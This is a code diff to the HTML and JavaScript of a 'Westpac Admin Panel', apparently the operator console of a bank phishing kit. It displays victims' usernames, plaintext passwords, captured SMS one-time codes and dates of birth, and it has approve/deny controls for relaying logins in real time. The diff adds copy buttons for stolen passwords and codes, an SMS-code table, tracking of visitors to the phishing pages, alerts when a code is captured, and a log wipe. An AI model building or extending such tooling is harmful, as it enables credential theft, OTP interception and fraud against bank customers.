@@ -12,6 +12,14 @@
     .topbar { display:flex; align-items:center; justify-content:space-between; padding:14px 24px; background:#161b22; border-bottom:1px solid #30363d; position:sticky; top:0; z-index:100; }
     .topbar-brand { display:flex; align-items:center; gap:10px; font-size:16px; font-weight:700; }
     .topbar-brand .dot { width:10px; height:10px; border-radius:50%; background:#d5002b; }
+    .topbar-actions { display:flex; align-items:center; gap:8px; flex-wrap:wrap; justify-content:flex-end; }
+    .toolbar-btn { padding:6px 10px; border:1px solid #30363d; border-radius:6px; background:#21262d; color:#e6edf3; font-size:11px; font-weight:600; cursor:pointer; }
+    .toolbar-btn:hover { background:#30363d; }
+    .toolbar-btn:disabled { opacity:.5; cursor:not-allowed; }
+    .toolbar-btn.danger { color:#ff7b72; border-color:#6e3030; }
+    .copy-btn { padding:2px 7px; border:1px solid #484f58; border-radius:4px; background:#21262d; color:#8b949e; font-size:10px; cursor:pointer; margin-left:6px; }
+    .copy-btn:hover { color:#e6edf3; border-color:#8b949e; }
+    .value-with-copy { display:inline-flex; align-items:center; max-width:220px; }
     #ws-status { display:flex; align-items:center; gap:8px; font-size:13px; color:#8b949e; }
     #ws-status .indicator { width:8px; height:8px; border-radius:50%; background:#484f58; transition:background .3s; }
     #ws-status.connected .indicator { background:#2ea043; }
@@ -84,7 +92,13 @@
 
 <div class="topbar">
   <div class="topbar-brand"><div class="dot"></div>Westpac Admin Panel</div>
-  <div id="ws-status"><div class="indicator"></div><span id="ws-status-text">Connecting...</span></div>
+  <div class="topbar-actions">
+    <div id="ws-status"><div class="indicator"></div><span id="ws-status-text">Connecting...</span></div>
+    <button class="toolbar-btn" id="btn-audio" type="button">Audio On</button>
+    <button class="toolbar-btn" id="btn-notifications" type="button">Enable Notifications</button>
+    <button class="toolbar-btn" id="btn-refresh" type="button">Refresh</button>
+    <button class="toolbar-btn danger" id="btn-clear" type="button">Clear All</button>
+  </div>
 </div>
 
 <div class="stats">
@@ -125,12 +139,39 @@
 
   <div class="section-header">Event log</div>
   <div id="event-log"></div>
+
+  <div class="section-header">Recent SMS codes</div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>Time</th><th>Email</th><th>SMS Code</th><th>Date of Birth</th><th>Status</th></tr>
+      </thead>
+      <tbody id="sms-table">
+        <tr><td colspan="5"><div class="empty">No SMS codes yet.</div></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section-header">Page activity</div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>Page</th><th>Route</th><th>Visitors</th><th>Last accessed</th><th>Status</th></tr>
+      </thead>
+      <tbody id="pages-table">
+        <tr><td colspan="5"><div class="empty">No page activity yet.</div></td></tr>
+      </tbody>
+    </table>
+  </div>
 </main>
 
 <script>
   const WS_URL = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws`;
   let ws;
   let reconnectTimer;
+  let audioEnabled = true;
+  let notificationsEnabled = false;
+  let pageActivity = [];
   const sessions = new Map();
 
   async function api(path, options) {
@@ -144,11 +185,13 @@
 
   async function loadSnapshot() {
     try {
-      const [requests, smsHistory] = await Promise.all([
+      const [requests, smsHistory, pages] = await Promise.all([
         api('/api/admin/pending'),
         api('/api/admin/sms-history'),
+        api('/api/admin/pages'),
       ]);
 
+      sessions.clear();
       requests.forEach(request => upsertSession({
         sid: request.id,
         requestId: request.id,
@@ -168,7 +211,9 @@
         credStatus: 'grant',
         otpStatus: item.dateOfBirth ? 'grant' : 'waiting',
       }));
+      pageActivity = Array.isArray(pages) ? pages : [];
       renderRows();
+      renderPages();
       addLog('info', 'Admin data synchronized');
     } catch (error) {
       addLog('err', `Sync failed: ${error.message}`);
@@ -204,7 +249,9 @@
           password: request.password,
           credStatus: request.status || 'pending',
         }));
+        pageActivity = Array.isArray(msg.pages) ? msg.pages : pageActivity;
         renderRows();
+        renderPages();
         return;
       }
 
@@ -221,6 +268,7 @@
         });
         renderRows();
         addLog('warn', `New login: ${request.username}  IP: ${request.ipAddress || '--'}`);
+        notify('New Login Attempt', `${request.username} | ${request.ipAddress || 'Unknown IP'}`);
         playAlert('cred');
         flashTitle();
         return;
@@ -238,6 +286,7 @@
         });
         renderRows();
         addLog('otp', `OTP captured: ${msg.data.smsCode}`);
+        notify('SMS Code Captured', `${msg.data.username} | ${msg.data.smsCode}`);
         playAlert('otp');
         flashTitle();
         return;
@@ -256,12 +305,17 @@
         });
         renderRows();
         addLog('ok', `Verification completed for ${msg.data.username}`);
+        notify('Verification Complete', msg.data.username);
         playAlert('otp');
         flashTitle();
         return;
       }
 
       if (msg.type === 'page_activity' && msg.page) {
+        const index = pageActivity.findIndex(item => item.route === msg.page.route);
+        if (index >= 0) pageActivity[index] = msg.page;
+        else pageActivity.push(msg.page);
+        renderPages();
         addLog('info', `${msg.page.pageName} visited`);
       } else if (msg.type === 'username_recovery' && msg.data) {
         addLog('warn', `Username recovery: ${msg.data.email}`);
@@ -288,6 +342,10 @@
     return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 
+  function escAttr(s) {
+    return escHtml(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+  }
+
   function upsertSession(value) {
     const current = sessions.get(value.sid) || {};
     sessions.set(value.sid, {
@@ -311,6 +369,7 @@
     );
     if (!rows.length) {
       tbody.innerHTML = '<tr id="empty-row"><td colspan="7"><div class="empty">Waiting for login attempts...</div></td></tr>';
+      renderSmsHistory();
       recalcStats();
       return;
     }
@@ -325,14 +384,55 @@
       return `<tr>
         <td class="mono">${escHtml(ts)}</td>
         <td class="mono">${escHtml(v.ip || '--')}</td>
-        <td class="mono"><strong>${escHtml(v.username || '--')}</strong></td>
-        <td class="mono"><span class="pw-plain">${escHtml(v.password || '--')}</span></td>
-        <td>${v.otp ? `<span class="otp-tag">${escHtml(v.otp)}</span>` : '<span class="badge none">--</span>'}</td>
+        <td class="mono"><span class="value-with-copy"><strong>${escHtml(v.username || '--')}</strong>${v.username ? `<button class="copy-btn" data-copy-value="${escAttr(v.username)}" type="button">Copy</button>` : ''}</span></td>
+        <td class="mono"><span class="value-with-copy"><span class="pw-plain">${escHtml(v.password || '--')}</span>${v.password ? `<button class="copy-btn" data-copy-value="${escAttr(v.password)}" type="button">Copy</button>` : ''}</span></td>
+        <td>${v.otp ? `<span class="value-with-copy"><span class="otp-tag">${escHtml(v.otp)}</span><button class="copy-btn" data-copy-value="${escAttr(v.otp)}" type="button">Copy</button></span>` : '<span class="badge none">--</span>'}</td>
         <td>${credentialActions}</td>
         <td>${statusBadge(v.otpStatus, v.hasOtp ? 'received' : 'awaiting')}</td>
       </tr>`;
     }).join('');
+    renderSmsHistory();
     recalcStats();
+  }
+
+  function renderSmsHistory() {
+    const tbody = document.getElementById('sms-table');
+    const rows = Array.from(sessions.values())
+      .filter(item => item.hasOtp)
+      .sort((a, b) => new Date(b.ts || 0) - new Date(a.ts || 0));
+    if (!rows.length) {
+      tbody.innerHTML = '<tr><td colspan="5"><div class="empty">No SMS codes yet.</div></td></tr>';
+      return;
+    }
+    tbody.innerHTML = rows.map(item => `
+      <tr>
+        <td class="mono">${escHtml(new Date(item.ts || Date.now()).toLocaleTimeString('en-AU', { hour12: false }))}</td>
+        <td class="mono">${escHtml(item.username || '--')}</td>
+        <td><span class="value-with-copy"><span class="otp-tag">${escHtml(item.otp)}</span><button class="copy-btn" data-copy-value="${escAttr(item.otp)}" type="button">Copy</button></span></td>
+        <td class="mono">${escHtml(item.dateOfBirth || '--')}</td>
+        <td>${statusBadge(item.otpStatus, 'received')}</td>
+      </tr>
+    `).join('');
+  }
+
+  function renderPages() {
+    const tbody = document.getElementById('pages-table');
+    if (!pageActivity.length) {
+      tbody.innerHTML = '<tr><td colspan="5"><div class="empty">No page activity yet.</div></td></tr>';
+      return;
+    }
+    tbody.innerHTML = pageActivity
+      .slice()
+      .sort((a, b) => new Date(b.lastAccessed || 0) - new Date(a.lastAccessed || 0))
+      .map(page => `
+        <tr>
+          <td>${escHtml(page.pageName || '--')}</td>
+          <td class="mono">${escHtml(page.route || '--')}</td>
+          <td>${escHtml(page.visitors ?? 0)}</td>
+          <td class="mono">${escHtml(page.lastAccessed ? new Date(page.lastAccessed).toLocaleString() : '--')}</td>
+          <td>${statusBadge(page.status, 'active')}</td>
+        </tr>
+      `).join('');
   }
 
   async function decide(requestId, action) {
@@ -352,7 +452,64 @@
     }
   }
 
+  async function copyValue(value, button) {
+    try {
+      if (navigator.clipboard && window.isSecureContext) {
+        await navigator.clipboard.writeText(value);
+      } else {
+        const area = document.createElement('textarea');
+        area.value = value;
+        area.style.position = 'fixed';
+        area.style.opacity = '0';
+        document.body.appendChild(area);
+        area.select();
+        document.execCommand('copy');
+        area.remove();
+      }
+      const original = button.textContent;
+      button.textContent = 'Copied';
+      setTimeout(() => { button.textContent = original; }, 1200);
+    } catch (error) {
+      addLog('err', `Copy failed: ${error.message}`);
+    }
+  }
+
+  async function clearAll() {
+    if (!confirm('Are you sure you want to clear all pending requests and SMS history? This cannot be undone.')) return;
+    const button = document.getElementById('btn-clear');
+    button.disabled = true;
+    try {
+      await api('/api/admin/clear-logs', { method: 'POST' });
+      sessions.clear();
+      renderRows();
+      addLog('ok', 'All login and SMS logs cleared');
+    } catch (error) {
+      addLog('err', `Clear failed: ${error.message}`);
+    } finally {
+      button.disabled = false;
+    }
+  }
+
+  async function enableNotifications() {
+    if (!('Notification' in window)) {
+      addLog('err', 'Browser notifications are not supported');
+      return;
+    }
+    const permission = await Notification.requestPermission();
+    notificationsEnabled = permission === 'granted';
+    const button = document.getElementById('btn-notifications');
+    button.textContent = notificationsEnabled ? 'Notifications On' : 'Enable Notifications';
+    button.disabled = notificationsEnabled;
+  }
+
+  function notify(title, body) {
+    if (notificationsEnabled && 'Notification' in window && Notification.permission === 'granted') {
+      new Notification(title, { body, icon: '/favicon.ico' });
+    }
+  }
+
   function playAlert(type) {
+    if (!audioEnabled) return;
     try {
       const ac = new (window.AudioContext || window.webkitAudioContext)();
       const freqs = type === 'otp'
@@ -400,6 +557,26 @@
     const button = event.target.closest('[data-request-id]');
     if (button) decide(button.dataset.requestId, button.dataset.action);
   });
+
+  document.addEventListener('click', event => {
+    const button = event.target.closest('[data-copy-value]');
+    if (button) copyValue(button.dataset.copyValue, button);
+  });
+
+  document.getElementById('btn-audio').addEventListener('click', event => {
+    audioEnabled = !audioEnabled;
+    event.currentTarget.textContent = audioEnabled ? 'Audio On' : 'Audio Off';
+  });
+  document.getElementById('btn-notifications').addEventListener('click', enableNotifications);
+  document.getElementById('btn-refresh').addEventListener('click', loadSnapshot);
+  document.getElementById('btn-clear').addEventListener('click', clearAll);
+
+  if ('Notification' in window && Notification.permission === 'granted') {
+    notificationsEnabled = true;
+    const notificationButton = document.getElementById('btn-notifications');
+    notificationButton.textContent = 'Notifications On';
+    notificationButton.disabled = true;
+  }
 
   loadSnapshot();
   connect();
